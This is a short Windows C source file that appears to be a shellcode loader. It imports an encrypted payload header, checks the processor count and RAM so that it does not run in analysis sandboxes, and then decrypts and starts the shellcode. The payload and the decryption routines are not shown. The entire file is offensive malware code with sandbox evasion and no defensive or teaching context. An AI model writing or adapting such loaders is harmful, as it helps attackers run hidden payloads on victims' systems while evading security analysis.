#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include "../payload_encrypted/payload.h"

bool checkResources() {
    SYSTEM_INFO s;
    MEMORYSTATUSEX ms;
    DWORD procNum;
    DWORD ram;

    // check number of processors
    GetSystemInfo(&s);
    procNum = s.dwNumberOfProcessors;
    if (procNum < 2){
        return false;
    }
    // check RAM
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
    if (ram < 2){ 
        return false;
    }
    return true;
}
int main(){
    if (checkResources()){
        decryptShellCode();
        startShellCode();
    }
}